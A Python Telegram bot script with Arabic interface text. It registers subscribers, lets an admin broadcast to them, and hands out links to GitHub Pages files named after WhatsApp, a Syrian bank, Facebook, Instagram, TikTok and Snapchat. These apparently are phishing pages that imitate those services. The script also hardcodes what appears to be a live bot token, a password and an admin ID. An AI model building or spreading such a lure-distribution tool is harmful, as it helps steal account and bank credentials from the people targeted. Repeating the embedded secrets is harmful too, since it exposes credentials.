import requests
import time
import logging
import json
import os

BOT_TOKEN = "8896364474:AAHxyXvrd5x8O2aP_7ybnIr8rm5w5Wm8zWM"
GITHUB_USER = "lwya42867-cell"
REPO = "forms2"
PASSWORD = "941902"
ADMIN_ID = "8823506156"

# الأسماء التي ستظهر على الأزرار
LINKS = {
    "wa": {"name": "📱 واتساب", "url": f"https://{GITHUB_USER}.github.io/{REPO}/wa2.html"},
    "bank": {"name": "🏦 سوريا بنك", "url": f"https://{GITHUB_USER}.github.io/{REPO}/syrian_bank.html"},
    "roulette": {"name": "🎰 روليت", "url": f"https://{GITHUB_USER}.github.io/{REPO}/roulette.html"},
    "fb": {"name": "📘 فيسبوك", "url": f"https://{GITHUB_USER}.github.io/{REPO}/fb.html"},
    "insta": {"name": "📷 انستغرام", "url": f"https://{GITHUB_USER}.github.io/{REPO}/instagram.html"},
    "tiktok": {"name": "🎵 تيك توك", "url": f"https://{GITHUB_USER}.github.io/{REPO}/tiktok.html"},
    "snap": {"name": "👻 سناب شات", "url": f"https://{GITHUB_USER}.github.io/{REPO}/snapchat.html"},
    "chat": {"name": "💬 دردشة", "url": f"https://{GITHUB_USER}.github.io/{REPO}/chat.html"}
}

SUBSCRIBERS_FILE = "/data/data/com.termux/files/home/subscribers5.json"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def load_subs():
    if os.path.exists(SUBSCRIBERS_FILE):
        try:
            with open(SUBSCRIBERS_FILE, 'r') as f: return json.load(f)
        except: return []
    return []

def save_subs(subs):
    with open(SUBSCRIBERS_FILE, 'w') as f: json.dump(subs, f)

def send_message(chat_id, text, keyboard=None):
    try:
        data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        if keyboard:
            data["reply_markup"] = json.dumps({"inline_keyboard": keyboard})
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data)
    except Exception as e:
        logging.error(f"send error: {e}")

def answer_callback(callback_id, text=""):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                      data={"callback_query_id": callback_id, "text": text})
    except Exception as e:
        logging.error(f"callback error: {e}")

def get_updates(offset=None):
    params = {"timeout": 30}
    if offset: params["offset"] = offset
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params=params)
        return r.json()
    except Exception as e:
        logging.error(f"get_updates error: {e}")
        return {}

def build_keyboard():
    keys = list(LINKS.keys())
    keyboard = []
    for i in range(0, len(keys), 2):
        row = []
        for k in keys[i:i+2]:
            row.append({"text": LINKS[k]["name"], "callback_data": k})
        keyboard.append(row)
    return keyboard

def main():
    subs = load_subs()
    offset = None
    logging.info("البوت بدأ العمل...")
    while True:
        updates = get_updates(offset)
        if "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1

                # استقبال الرسائل النصية
                if "message" in update:
                    chat_id = update["message"]["chat"]["id"]
                    text = update["message"].get("text", "")

                    if text == "/start":
                        if chat_id not in subs:
                            subs.append(chat_id)
                            save_subs(subs)
                        send_message(chat_id, "أهلاً بك! اختر الخدمة التي تريدها من الأزرار أدناه:",
                                     keyboard=build_keyboard())

                    elif str(chat_id) == ADMIN_ID and text.startswith("/send"):
                        msg = text.replace("/send", "").strip()
                        for user in subs:
                            send_message(user, msg)

                # استقبال ضغطات الأزرار
                elif "callback_query" in update:
                    cb = update["callback_query"]
                    chat_id = cb["message"]["chat"]["id"]
                    cb_id = cb["id"]
                    data = cb.get("data", "")

                    if data in LINKS:
                        send_message(chat_id, f"{LINKS[data]['name']}\n{LINKS[data]['url']}")
                        answer_callback(cb_id, "تم إرسال الرابط ✅")
                    else:
                        answer_callback(cb_id, "خيار غير معروف ❌")

        time.sleep(2)

if __name__ == "__main__":
    main()
